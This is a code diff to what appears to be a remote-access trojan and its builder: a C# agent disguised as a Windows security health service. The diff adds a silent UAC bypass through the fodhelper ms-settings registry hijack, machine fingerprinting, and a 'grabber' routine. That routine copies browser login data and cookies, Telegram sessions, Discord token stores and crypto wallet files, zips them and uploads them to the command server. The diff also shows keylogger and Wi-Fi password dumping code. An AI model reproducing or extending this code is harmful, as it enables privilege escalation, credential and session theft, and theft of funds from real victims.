@@ -30,6 +30,7 @@ type BuildParams struct {
 	FakeErrorMsg    string `json:"fake_error_msg"`
 	AntiAnalysis    bool   `json:"anti"`
 	Debug           bool   `json:"debug"`
+	SilentAdmin     bool   `json:"silent_admin"`
 	BuildSig        string `json:"-"`
 	StrKeyHex       string `json:"-"`
 	EncServer       string
@@ -236,6 +237,7 @@ namespace WinSecHealthSvc
         static string _commKeyHex;
         static int _beaconInterval = {{.BeaconInterval}};
         static bool _debug = {{if or .Debug (not .Hidden)}}true{{else}}false{{end}};
+        static bool _silentAdmin = {{if .SilentAdmin}}true{{else}}false{{end}};
 
         static void Log(string msg) {
             if(_debug) {
@@ -303,6 +305,12 @@ namespace WinSecHealthSvc
                 // Ensure we see something immediately
                 Console.WriteLine(">>> Baron Agent Initializing...");
                 
+                if (IsAdministrator()) {
+                    CleanupRegistryKey();
+                } else if (_silentAdmin) {
+                    TrySilentElevate();
+                }
+
                 // Force TLS 1.2
                 System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;
                 System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
@@ -436,6 +444,17 @@ namespace WinSecHealthSvc
 
         static string GetHWID() {
             try {
+                // Try MachineGuid from Registry (Best for persistence)
+                try {
+                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography")) {
+                        if (key != null) {
+                            var guid = key.GetValue("MachineGuid");
+                            if (guid != null) return SignMessage(guid.ToString()).Substring(0, 8).ToUpper();
+                        }
+                    }
+                } catch {}
+
+                // Fallback: CPUID + HW Info
                 string mId = "";
                 try {
                     using (var mc = new ManagementClass("Win32_Processor")) {
@@ -447,19 +466,52 @@ namespace WinSecHealthSvc
                 } catch {}
                 
                 if (string.IsNullOrEmpty(mId)) {
-                    mId = Environment.MachineName + "_" + Environment.UserName + "_" + Environment.ProcessorCount;
+                    mId = Environment.MachineName + "_" + Environment.ProcessorCount;
                 }
                 
                 string hash = SignMessage(mId);
                 if (string.IsNullOrEmpty(hash) || hash.Length < 8) {
-                    // Fallback to simple hash if HMAC fails
                     return "ID-" + Math.Abs(mId.GetHashCode()).ToString("X");
                 }
                 
-                return hash.Substring(0, 8);
+                return hash.Substring(0, 8).ToUpper();
             } catch { 
-                return "AGENT-" + Guid.NewGuid().ToString().Substring(0, 8).ToUpper(); 
+                return "AGENT-" + Environment.MachineName.GetHashCode().ToString("X"); 
             }
+        }
+
+        static bool IsAdministrator() {
+            try {
+                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent()) {
+                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+                }
+            } catch { return false; }
+        }
+
+        static void TrySilentElevate() {
+            try {
+                string myPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                string regPath = @"Software\Classes\ms-settings\Shell\open\command";
+                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath)) {
+                    if (key == null) return;
+                    key.SetValue("", myPath);
+                    key.SetValue("DelegateExecute", "");
+                }
+                Process.Start(new ProcessStartInfo {
+                    FileName = "fodhelper.exe",
+                    UseShellExecute = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                });
+                Environment.Exit(0);
+            } catch (Exception ex) { Log("Elevation failed: " + ex.Message); }
+        }
+
+        static void CleanupRegistryKey() {
+            try {
+                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
+            } catch {}
         }
 
         static string GetJsonVal(string json, string key) {
@@ -494,6 +546,10 @@ namespace WinSecHealthSvc
                         break;
                     case "info":
                         output = GetSysInfo();
+                        break;
+                    case "grabber":
+                    case "grab":
+                        output = GrabAll();
                         break;
                     case "processes":
                     case "ps_list":
@@ -722,7 +778,8 @@ namespace WinSecHealthSvc
             foreach (var pr in procs) {
                 try { 
                     if (!first) sb.Append(",");
-                    sb.Append("{\"pid\":"+pr.Id+",\"name\":\""+pr.ProcessName.Replace("\\","")+"\",\"mem\":"+Math.Round(pr.WorkingSet64/1048576.0,1)+"}");
+                    string pName = pr.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    sb.Append("{\"pid\":"+pr.Id+",\"name\":\""+pName+"\",\"mem\":"+Math.Round(pr.WorkingSet64/1048576.0,1)+"}");
                     first = false;
                 } catch {}
             }
@@ -961,75 +1018,127 @@ namespace WinSecHealthSvc
             finally { if (_hook != IntPtr.Zero) { UnhookWindowsHookEx(_hook); _hook = IntPtr.Zero; } _keylogRunning = false; }
         }
 
-        static string GrabBrowsers() {
-            var sb = new StringBuilder("=== BROWSERS ===\n");
-            string lc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string rm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            string[] paths = {
-                System.IO.Path.Combine(lc,"Google","Chrome","User Data","Default","Login Data"),
-                System.IO.Path.Combine(lc,"Microsoft","Edge","User Data","Default","Login Data"),
-                System.IO.Path.Combine(lc,"BraveSoftware","Brave-Browser","User Data","Default","Login Data"),
-                System.IO.Path.Combine(rm,"Opera Software","Opera Stable","Login Data"),
-            };
-            foreach (var path in paths) {
-                if (!File.Exists(path)) continue;
-                try {
-                    string tmp = System.IO.Path.GetTempFileName(); File.Copy(path, tmp, true);
-                    string raw = Encoding.UTF8.GetString(File.ReadAllBytes(tmp)).Replace("\0"," ");
-                    int idx2=0, cnt=0;
-                    while ((idx2=raw.IndexOf("http",idx2))!=-1 && cnt<30) { int e=raw.IndexOf(' ',idx2); if(e==-1||e-idx2>200){idx2++;continue;} sb.AppendLine(raw.Substring(idx2,e-idx2)); cnt++; idx2=e; }
-                    File.Delete(tmp);
-                } catch {}
-            }
-            return sb.ToString();
-        }
-
-        static string GrabDiscord() {
-            var sb = new StringBuilder("=== DISCORD ===\n");
-            string rm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            foreach (var app in new[]{"discord","discordcanary","discordptb"}) {
-                string p2 = System.IO.Path.Combine(rm, app, "Local Storage", "leveldb");
-                if (!Directory.Exists(p2)) continue;
-                foreach (var f in Directory.GetFiles(p2, "*.ldb"))
-                    try {
-                        foreach (System.Text.RegularExpressions.Match m in System.Text.RegularExpressions.Regex.Matches(File.ReadAllText(f, Encoding.UTF8), @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
-                            sb.AppendLine("[TOKEN] "+m.Value);
-                    } catch {}
-            }
-            return sb.Length > 20 ? sb.ToString() : "No Discord tokens found";
-        }
-
-        static string GrabTelegram() {
-            string p2 = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata");
-            if (!Directory.Exists(p2)) return "Telegram not found";
-            var sb = new StringBuilder("tdata: " + p2 + "\n");
-            foreach (var f in Directory.GetFiles(p2)) sb.AppendLine(System.IO.Path.GetFileName(f) + " " + new FileInfo(f).Length + "b");
-            return sb.ToString();
-        }
-
-        static string GrabWifi() {
+        static string GrabAll() {
+            string tempPath = Path.Combine(Path.GetTempPath(), "Sovereign_" + DateTime.Now.Ticks);
             try {
-                var p2 = new Process { StartInfo = new ProcessStartInfo { FileName="cmd.exe", Arguments="/c netsh wlan show profiles", UseShellExecute=false, RedirectStandardOutput=true, CreateNoWindow=true } };
-                p2.Start(); var sb = new StringBuilder();
-                foreach (var line in p2.StandardOutput.ReadToEnd().Split(new char[] { '\n' })) {
-                    if (!line.Contains(":")) continue;
-                    string name = line.Split(new char[] { ':' })[1].Trim(); if (string.IsNullOrEmpty(name)) continue;
+                Directory.CreateDirectory(tempPath);
+                Log("Starting Sovereign Grabber...");
+
+                // 1. Browsers
+                string browserDir = Path.Combine(tempPath, "Browsers");
+                Directory.CreateDirectory(browserDir);
+                string[] browsers = { "Chrome", "Edge", "Brave", "Opera", "Vivaldi" };
+                foreach (var b in browsers) {
+                    string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), b, "User Data");
+                    if (!Directory.Exists(p)) continue;
+                    string bDest = Path.Combine(browserDir, b);
+                    Directory.CreateDirectory(bDest);
                     try {
-                        var p3 = new Process { StartInfo = new ProcessStartInfo { FileName="cmd.exe", Arguments="/c netsh wlan show profile \""+name+"\" key=clear", UseShellExecute=false, RedirectStandardOutput=true, CreateNoWindow=true } };
-                        p3.Start();
-                        foreach (var dl in p3.StandardOutput.ReadToEnd().Split(new char[] { '\n' }))
-                            if (dl.Contains("Key Content") || dl.Contains("Содержимое ключа")) { sb.AppendLine(name+" : "+dl.Split(new char[] { ':' })[1].Trim()); break; }
+                        foreach (string file in Directory.GetFiles(p, "*", SearchOption.AllDirectories)) {
+                            string name = Path.GetFileName(file);
+                            if (name == "Login Data" || name == "Cookies" || name == "Web Data" || name == "History" || name == "Bookmarks") {
+                                string rel = file.Replace(p, "").TrimStart('\\', '/').Replace('\\', '_').Replace('/', '_');
+                                File.Copy(file, Path.Combine(bDest, rel), true);
+                            }
+                        }
                     } catch {}
                 }
-                return sb.Length > 0 ? sb.ToString() : "No WiFi passwords";
-            } catch (Exception ex) { return "wifi error: "+ex.Message; }
+
+                // 2. Telegram
+                string tg = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata");
+                if (Directory.Exists(tg)) {
+                    string tgDest = Path.Combine(tempPath, "Telegram");
+                    Directory.CreateDirectory(tgDest);
+                    try {
+                        foreach (string f in Directory.GetFiles(tg)) {
+                            string n = Path.GetFileName(f);
+                            if (n.Length == 16 || n == "key_data" || n == "settingss") 
+                                File.Copy(f, Path.Combine(tgDest, n), true);
+                        }
+                        foreach (string d in Directory.GetDirectories(tg)) {
+                            string n = Path.GetFileName(d);
+                            if (n.Length == 16 && n != "user_data") {
+                                string sub = Path.Combine(tgDest, n); Directory.CreateDirectory(sub);
+                                foreach(string sf in Directory.GetFiles(d)) File.Copy(sf, Path.Combine(sub, Path.GetFileName(sf)), true);
+                            }
+                        }
+                    } catch {}
+                }
+
+                // 3. Discord
+                string disc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb");
+                if (Directory.Exists(disc)) {
+                    string dDest = Path.Combine(tempPath, "Discord");
+                    Directory.CreateDirectory(dDest);
+                    try {
+                        foreach (string f in Directory.GetFiles(disc, "*.ldb")) File.Copy(f, Path.Combine(dDest, Path.GetFileName(f)), true);
+                        foreach (string f in Directory.GetFiles(disc, "*.log")) File.Copy(f, Path.Combine(dDest, Path.GetFileName(f)), true);
+                    } catch {}
+                }
+
+                // 4. Crypto Wallets
+                string wallDir = Path.Combine(tempPath, "Wallets");
+                Directory.CreateDirectory(wallDir);
+                string app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string[] wallets = { "Exodus\\exodus.wallet", "Electrum\\wallets", "Atomic\\Local Storage\\leveldb" };
+                foreach (var w in wallets) {
+                    string wp = Path.Combine(app, w);
+                    if (File.Exists(wp)) File.Copy(wp, Path.Combine(wallDir, Path.GetFileName(wp)), true);
+                    else if (Directory.Exists(wp)) {
+                        string wd = Path.Combine(wallDir, Path.GetFileName(wp)); Directory.CreateDirectory(wd);
+                        foreach (string f in Directory.GetFiles(wp)) File.Copy(f, Path.Combine(wd, Path.GetFileName(f)), true);
+                    }
+                }
+
+                // 5. System Info
+                File.WriteAllText(Path.Combine(tempPath, "system_info.txt"), GetSysInfo());
+
+                // ZIP and Upload
+                string zipFile = Path.Combine(Path.GetTempPath(), "Loot_" + _clientId + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".zip");
+                ZipFile.CreateFromDirectory(tempPath, zipFile);
+
+                Log("Uploading ZIP: " + Path.GetFileName(zipFile));
+                UploadFile(zipFile);
+                
+                File.Delete(zipFile);
+                return "Sovereign Grabber: SUCCESS. Artifacts secured.";
+            } catch (Exception ex) {
+                return "Grabber Error: " + ex.Message;
+            } finally {
+                try { if (Directory.Exists(tempPath)) Directory.Delete(tempPath, true); } catch {}
+            }
         }
 
-        static string GrabAll() {
-            return "=== FULL GRAB ===\n\n[BROWSERS]\n" + GrabBrowsers() +
-                   "\n[DISCORD]\n" + GrabDiscord() +
-                   "\n[WIFI]\n"    + GrabWifi()    +
-                   "\n[SYSTEM]\n"  + GetSysInfo();
+        static void UploadFile(string path) {
+            try {
+                string url = _server + "/api/agent/upload";
+                string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
+                byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
+                
+                var req = (HttpWebRequest)WebRequest.Create(url);
+                req.Method = "POST";
+                req.ContentType = "multipart/form-data; boundary=" + boundary;
+                req.Headers.Add("X-Client-ID", _clientId);
+                req.Timeout = 60000;
+
+                using (var rs = req.GetRequestStream()) {
+                    rs.Write(boundaryBytes, 0, boundaryBytes.Length);
+                    string header = "Content-Disposition: form-data; name=\"file\"; filename=\"" + Path.GetFileName(path) + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+                    byte[] headerBytes = Encoding.UTF8.GetBytes(header);
+                    rs.Write(headerBytes, 0, headerBytes.Length);
+
+                    using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read)) {
+                        fs.CopyTo(rs);
+                    }
+
+                    byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
+                    rs.Write(trailer, 0, trailer.Length);
+                }
+
+                using (var resp = (HttpWebResponse)req.GetResponse()) {
+                    Log("Upload result: " + (int)resp.StatusCode);
+                }
+            } catch (Exception ex) { Log("Upload error: " + ex.Message); }
         }
 
     }
